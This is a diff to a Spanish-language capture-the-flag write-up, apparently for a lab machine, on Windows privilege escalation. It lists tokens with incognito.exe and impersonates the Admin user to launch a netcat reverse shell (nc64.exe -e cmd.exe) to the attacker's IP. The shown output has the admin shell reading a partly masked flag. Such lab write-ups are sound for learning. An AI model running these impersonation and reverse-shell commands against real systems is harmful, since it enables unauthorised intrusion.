@@ -440,9 +440,9 @@ Cuando obtenemos consola en la maquina si nos fijamos la unidad es la E:\ , que 
  
   	Link --> [+] https://github.com/FSecureLABS/incognito/blob/394545ffb844afcc18e798737cbd070ff3a4eb29/incognito.exe
 
-  - Listamos Tokens disponibles de usuarios del sistema.
+  - Listamos Tokens disponibles de usuarios del sistema, vemos que tenemos disponible SeImpersonatePrivilege(Importante).
     
-		PS C:\temp> .\incognito.exe list_tokens -u
+		PS C:\> .\incognito.exe list_tokens -u
 		.\incognito.exe list_tokens -u
 		[*] Enumerating tokens
 		[*] Listing unique users found
@@ -480,7 +480,36 @@ Cuando obtenemos consola en la maquina si nos fijamos la unidad es la E:\ , que 
 	para acceder a recursos en otro servidor. Por lo tanto, su objetivo principal es permitir a un servicio actuar
 	en nombre de un usuario para realizar acciones en su nombre.
 
-  - Executamos un nuevo proceso en es
+  - Ejecutamos una conexion inversa con ayuda de netcat e incognito.exe, como resultado nos devolvera una consola de comandos como usuario Admin.
+
+	Nos ponemos es escucha en el puerto indicado
+
+		┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
+		└─# rlwrap nc -lvnp 2020
+		listening on [any] 2020 ...
+
+	Ejecutamos comando
+
+		PS C:\> .\incognito.exe execute -c "WIN-8VMBKF3G815\Admin" ".\nc64.exe -e cmd.exe 10.9.92.151 2020"
+		.\incognito.exe execute -c "WIN-8VMBKF3G815\Admin" ".\nc64.exe -e cmd.exe 10.9.92.151 2020"
+
+	Bingo somo usuario Admin, leemos flag root.txt
+
+		┌──(root㉿kali)-[/home/…/ctf/try_ctf/iron_corp/contenido]
+		└─# rlwrap nc -lvnp 2020
+		listening on [any] 2020 ...
+		connect to [10.9.92.151] from (UNKNOWN) [10.10.178.36] 50134
+		Microsoft Windows [Version 10.0.14393]
+		(c) 2016 Microsoft Corporation. All rights reserved.
+		
+		C:\>whoami
+		whoami
+		win-8vmbkf3g815\admin
+		C:\Users\Admin\Desktop>type root.txt
+		type root.txt
+		thm{a1f936a086b----------7dd6cd2e2bd}
+
+
 
       		
 
